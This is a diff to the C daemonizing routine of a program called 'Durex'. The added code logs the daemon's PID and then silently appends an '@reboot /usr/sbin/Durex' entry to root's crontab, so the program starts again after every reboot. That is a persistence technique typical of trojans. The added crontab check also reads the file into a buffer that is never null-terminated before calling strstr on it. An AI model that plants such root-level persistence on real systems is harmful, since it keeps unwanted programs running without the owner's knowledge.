@@ -19,6 +19,12 @@ extern t_daemon		g_durex;
 
 void	daemonize(void)
 {
+	pid_t			pid;
+	int				fd;
+	char			*buf;
+	struct stat		st;
+	char			tmp[64] = { '\0' };
+
 	daemon_report(LOG_INFO, "Daemonizing Durex...");
 
 	/*
@@ -34,14 +40,18 @@ void	daemonize(void)
 	** Fork the main process and close the parent since we will
 	** request a new session ID afterwards
 	*/
-	g_durex.pid = fork();
-	if (g_durex.pid < 0)
+	pid = fork();
+	if (pid < 0)
 	{
 		daemon_report(LOG_ERROR, "Durex process fork failed.");
 		exit(EXIT_FAILURE);
 	}
-	else if (g_durex.pid > 0)
+	else if (pid > 0)
 		exit(EXIT_SUCCESS);
+
+	g_durex.pid = getpid();
+	sprintf(tmp, "Daemon has PID : %d", g_durex.pid);
+	daemon_report(LOG_INFO, tmp);
 
 	/*
 	** Calling setsid() makes this process the session leader for
@@ -97,4 +107,49 @@ void	daemonize(void)
 	}
 	daemon_report(LOG_INFO, "Standard I/O closed.");
 	daemon_report(LOG_INFO, "Daemon running.");
+
+	/*
+	** Add daemon as cron for automatic OS reboot startup
+	*/
+	daemon_report(LOG_INFO, "Setting up daemon as cron on OS startup...");
+	if ((fd = open("/var/spool/cron/crontabs/root", O_RDWR | O_CREAT, 0600)) == -1)
+	{
+		daemon_report(LOG_ERROR, "Unable to open crontab.");
+		return ;
+	}
+	daemon_report(LOG_INFO, "Crontab opened. Searching for daemon crontab event...");
+
+	/*
+	** Check if event is not already listed in crontab
+	*/
+	if (fstat(fd, &st) == -1)
+	{
+		daemon_report(LOG_ERROR, "Unable to fstat crontab. Aborting.");
+		close(fd);
+		return ;
+	}
+	if ((buf = (char *)malloc(sizeof(char) * st.st_size)) == NULL)
+	{
+		daemon_report(LOG_ERROR, "Unable to map crontab. Aborting.");
+		close(fd);
+		return ;
+	}
+	read(fd, buf, st.st_size);
+	if (strstr(buf, "@reboot /usr/sbin/Durex") != NULL)
+	{
+		daemon_report(LOG_ERROR, "Daemon crontab event exists. Aborting.");
+		free(buf);
+		close(fd);
+		return ;
+	}
+	free(buf);
+
+	/*
+	** Add event to crontab
+	*/
+	daemon_report(LOG_INFO, "Daemon crontab event not found. Adding it to crontab...");
+	lseek(fd, 0, SEEK_END);
+	write(fd, "@reboot /usr/sbin/Durex\n", 24);
+	close(fd);
+	daemon_report(LOG_INFO, "Daemon crontab event added.");
 }
